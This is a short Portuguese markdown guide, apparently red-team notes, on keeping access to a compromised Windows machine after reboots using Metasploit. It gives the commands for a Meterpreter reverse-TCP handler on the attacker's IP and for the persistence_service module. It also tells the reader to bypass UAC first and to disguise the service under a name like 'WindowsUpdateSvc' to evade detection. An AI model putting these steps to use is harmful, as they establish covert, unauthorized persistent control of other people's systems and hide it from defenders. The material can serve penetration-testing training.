![Banner Dark Tech](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExN2dnanA2ZnR3cmUzNjdqbnJsbmhqYXEybXJsMmVqd2QxY2c5OXdnZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKy99YozGr2UAuI/giphy.gif)

# ⚓ PERSISTENCE: MANTENDO O DOMÍNIO 

> **[!] GOAL:** Garantir que o acesso sobreviva a reboots e logoffs.
> **[!] REQUISITO:** Privilégios de Administrador (SYSTEM).

---

## 🛠️ 01. ESTABELECENDO A ÂNCORA
O uso do `persistence_service` cria um serviço legítimo no Windows que executa o seu payload sempre que o sistema inicia.

**Setup do Handler (Aguardando a volta):**
```bash
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set lhost <SEU_IP>
msf > set lport 2022  # Porta dedicada para persistência
msf > exploit -j      # Roda em segundo plano
```

Execução da Persistência:
```bash
msf > use exploit/windows/local/persistence_service
msf > set session <ID>
msf > set lport 2022
msf > exploit
```
Porta Alternativa: Usar uma porta diferente (ex: 2022) para a persistência ajuda a não conflitar com a sua sessão principal.

Privilégios: Este módulo requer privilégios de Admin. Se falhar, execute o Bypass UAC primeiro.

Persistence Service: O Windows verá isso como um serviço. Em uma operação real, o nome do serviço deve ser alterado para algo "comum" (ex: WindowsUpdateSvc) para evitar detecção.
